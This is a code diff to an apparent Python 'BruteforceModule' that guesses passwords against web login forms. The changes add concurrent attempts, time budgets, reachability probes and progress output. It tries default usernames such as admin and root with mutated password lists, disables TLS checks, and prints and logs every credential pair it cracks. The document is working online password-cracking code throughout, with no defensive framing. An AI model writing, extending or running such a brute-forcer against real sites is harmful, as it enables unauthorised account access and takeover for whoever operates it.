@@ -2,11 +2,21 @@ import asyncio
 import aiohttp
 import logging
 import os
-from typing import Dict, List, Optional, Any
+import time
+from typing import Dict, List, Optional, Any, Tuple
 from urllib.parse import urljoin
 
 
 class BruteforceModule:
+    #: Per-form wall-clock budget so one blackholed host cannot stall a scan.
+    FORM_DEADLINE_SECONDS = 120.0
+    #: Concurrent login attempts against a single form.
+    MAX_PARALLEL_ATTEMPTS = 8
+    #: Hard cap on attempts per form regardless of wordlist size.
+    MAX_ATTEMPTS_PER_FORM = 300
+    #: Single reachability probe before committing the whole budget.
+    PROBE_TIMEOUT = 6.0
+
     def __init__(self) -> None:
         self.session = aiohttp.ClientSession(
             timeout=aiohttp.ClientTimeout(total=30),
@@ -16,6 +26,80 @@ class BruteforceModule:
             connector=aiohttp.TCPConnector(ssl=False)
         )
         self.logger = logging.getLogger(__name__)
+
+    async def _form_reachable(self, url: str) -> bool:
+        """One cheap probe so a blackholed host costs seconds, not the budget."""
+        try:
+            async with self.session.get(
+                url, ssl=False, allow_redirects=True,
+                timeout=aiohttp.ClientTimeout(total=self.PROBE_TIMEOUT),
+            ) as response:
+                await response.read()
+                return response.status < 500
+        except Exception as exc:
+            self.logger.debug('reachability probe failed for %s: %s', url, exc)
+            return False
+
+    async def _run_attempts(
+        self,
+        form_url: str,
+        method: str,
+        username_field: str,
+        password_field: str,
+        attempts: List[Tuple[str, str]],
+        other_fields: Dict[str, str],
+    ) -> Optional[Tuple[str, str]]:
+        """Run login attempts concurrently with progress and a hard deadline.
+
+        Returns ``(username, password)`` for the first hit, otherwise
+        ``None``.  Prints progress so the operator can see the phase is alive.
+        """
+        total = min(len(attempts), self.MAX_ATTEMPTS_PER_FORM)
+        chunk_size = self.MAX_PARALLEL_ATTEMPTS * 4
+        semaphore = asyncio.Semaphore(self.MAX_PARALLEL_ATTEMPTS)
+        started = time.monotonic()
+        deadline = started + self.FORM_DEADLINE_SECONDS
+        index = 0
+
+        while index < total and time.monotonic() < deadline:
+            chunk = attempts[index:index + chunk_size]
+
+            async def _one(username: str, password: str) -> Tuple[str, str, bool]:
+                async with semaphore:
+                    ok = await self._try_login(
+                        form_url, method, username_field, password_field,
+                        username, password, other_fields)
+                    return username, password, ok
+
+            results = await asyncio.gather(
+                *(_one(username, password) for username, password in chunk),
+                return_exceptions=True)
+            index += len(chunk)
+
+            for item in results:
+                if isinstance(item, Exception):
+                    self.logger.debug('login attempt failed: %s', item)
+                    continue
+                if item[2]:
+                    elapsed = time.monotonic() - started
+                    print(f"    [+] SUCCESS: {item[0]}:{item[1]} on {form_url} "
+                          f"({index}/{total} attempts, {elapsed:.0f}s)")
+                    self.logger.warning(
+                        'Successful login found: %s:%s on %s',
+                        item[0], item[1], form_url)
+                    return item[0], item[1]
+
+            elapsed = time.monotonic() - started
+            print(f"    [*] {form_url}: {index}/{total} attempts "
+                  f"({elapsed:.0f}s elapsed)")
+
+        if index < total:
+            print(f"    [-] {form_url}: {self.FORM_DEADLINE_SECONDS:.0f}s budget "
+                  f"exhausted after {index}/{total} attempts, moving on")
+            self.logger.info(
+                'Bruteforce deadline reached on %s after %d attempts',
+                form_url, index)
+        return None
 
     async def bruteforce_login_forms(
         self,
@@ -69,54 +153,25 @@ class BruteforceModule:
                 print(f"    [-] Could not identify username/password fields for {form_url}")
                 continue
 
+            if not await self._form_reachable(form_url):
+                print(f"    [-] {form_url} unreachable (connect timeout/refused), "
+                      f"skipping form")
+                self.logger.warning(f"Skipping unreachable login form: {form_url}")
+                continue
+
             # Try combinations
-            attempt_count = 0
-            for username in usernames:
-                for password in passwords:
-                    attempt_count += 1
-                    data = {username_field: username, password_field: password}
-                    data.update(other_fields)
-
-                    try:
-                        if method == 'POST':
-                            async with self.session.post(form_url, data=data, ssl=False, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=8)) as response:
-                                content = await response.text()
-                        else:
-                            # For GET, though rare
-                            params = data
-                            async with self.session.get(form_url, params=params, ssl=False, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=8)) as response:
-                                content = await response.text()
-
-                        # Check for success indicators
-                        success_indicators = ['dashboard', 'welcome', 'logout', 'profile', 'admin', 'home', 'success', 'authenticated', 'user account']
-                        failure_indicators = ['invalid', 'incorrect', 'error', 'failed', 'wrong', 'login', 'unauthorized', 'forbidden', 'denied']
-
-                        content_lower = content.lower()
-                        has_success = any(ind in content_lower for ind in success_indicators)
-                        has_failure = any(ind in content_lower for ind in failure_indicators)
-                        
-                        # Enhanced heuristic: response status 200, decent size, no failure indicators
-                        if (has_success or (len(content) > 500 and not has_failure)) and response.status == 200:
-                            successful_logins.append({
-                                'url': form_url,
-                                'username': username,
-                                'password': password,
-                                'method': method
-                            })
-                            print(f"    [+] SUCCESS: {username}:{password} on {form_url}")
-                            self.logger.warning(f"Successful login found: {username}:{password} on {form_url}")
-                            break  # Found one, move to next form
-                    except Exception as e:
-                        self.logger.debug(f"Error bruteforcing {form_url}: {e}")
-                        continue
-                    
-                    # Progress logging every 50 attempts
-                    if attempt_count % 50 == 0:
-                        self.logger.info(f"Bruteforce progress: {attempt_count} attempts on {form_url}")
-                
-                if successful_logins and successful_logins[-1]['url'] == form_url:
-                    print(f"    [+] Form {form_url} compromised, moving to next form")
-                    break  # Already found for this form
+            attempts = [(username, password)
+                        for username in usernames for password in passwords]
+            hit = await self._run_attempts(
+                form_url, method, username_field, password_field,
+                attempts, other_fields)
+            if hit:
+                successful_logins.append({
+                    'url': form_url,
+                    'username': hit[0],
+                    'password': hit[1],
+                    'method': method
+                })
 
         return successful_logins
 
@@ -149,21 +204,31 @@ class BruteforceModule:
             username_field, password_field, other_fields = self._identify_fields(inputs)
 
             if not username_field or not password_field:
+                print(f"    [-] could not identify username/password fields, skipping")
+                continue
+
+            if not await self._form_reachable(form_url):
+                print(f"    [-] {form_url} unreachable (connect timeout/refused), "
+                      f"skipping form")
+                self.logger.warning(f"Skipping unreachable login form: {form_url}")
                 continue
 
             # Try intelligent combinations first
-            for username in ['admin', 'root', 'administrator']:
-                for password in intelligent_passwords[:50]:  # Limit attempts
-                    if await self._try_login(form_url, method, username_field, password_field, username, password, other_fields):
-                        successful_logins.append({
-                            'url': form_url,
-                            'username': username,
-                            'password': password,
-                            'method': 'intelligent'
-                        })
-                        break
-                if successful_logins and successful_logins[-1]['url'] == form_url:
-                    break
+            attempts = [
+                (username, password)
+                for username in ['admin', 'root', 'administrator']
+                for password in intelligent_passwords[:50]  # Limit attempts
+            ]
+            hit = await self._run_attempts(
+                form_url, method, username_field, password_field,
+                attempts, other_fields)
+            if hit:
+                successful_logins.append({
+                    'url': form_url,
+                    'username': hit[0],
+                    'password': hit[1],
+                    'method': 'intelligent'
+                })
 
         return successful_logins
 
@@ -175,6 +240,7 @@ class BruteforceModule:
             lambda x: x + '123',
             lambda x: x + '!',
             lambda x: x + '2024',
+            lambda x: x + '2026',
             lambda x: x.capitalize(),
             lambda x: x.upper(),
             lambda x: 'P@ssw0rd' if x == 'password' else x,
@@ -225,7 +291,7 @@ class BruteforceModule:
                     content = await response.text()
 
             # Check for success
-            success_indicators = ['dashboard', 'welcome', 'logout', 'profile', 'admin', 'home', 'success', 'authenticated']
+            success_indicators = ['dashboard', 'welcome', 'logout', 'profile', 'admin', 'home', 'success', 'authenticated', 'user account']
             failure_indicators = ['invalid', 'incorrect', 'error', 'failed', 'wrong', 'login', 'unauthorized', 'forbidden', 'denied']
 
             content_lower = content.lower()
